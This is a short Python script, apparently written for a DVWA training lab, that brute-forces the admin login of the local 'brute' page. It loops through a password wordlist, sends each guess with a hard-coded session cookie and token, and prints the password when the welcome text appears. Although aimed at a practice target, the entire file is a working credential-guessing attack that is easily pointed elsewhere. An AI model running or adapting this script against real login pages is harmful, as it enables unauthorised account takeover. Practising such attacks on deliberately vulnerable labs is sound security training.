import requests

password_list = []
with open("pwd.txt", "r") as file:
    for passw in file:
        pwd = passw.rstrip()
        password_list.append(pwd)

cookies = {'security': 'low', 'PHPSESSID': 'ssdoadnutgqvgmkel79mlle97i'}
for password in password_list:
    request = requests.get(
        f'http://localhost/dvwa/vulnerabilities/brute//?username=admin&password={password}&user_token=0552cc579cbfcb2967db9e697fb9478a&Login=Login#',
        auth=('admin', 'password'), verify=False, cookies=cookies)
    if "Welcome to the password protected area admin" in request.text:
        print(f"Login = admin, Correct password = {password}")
        break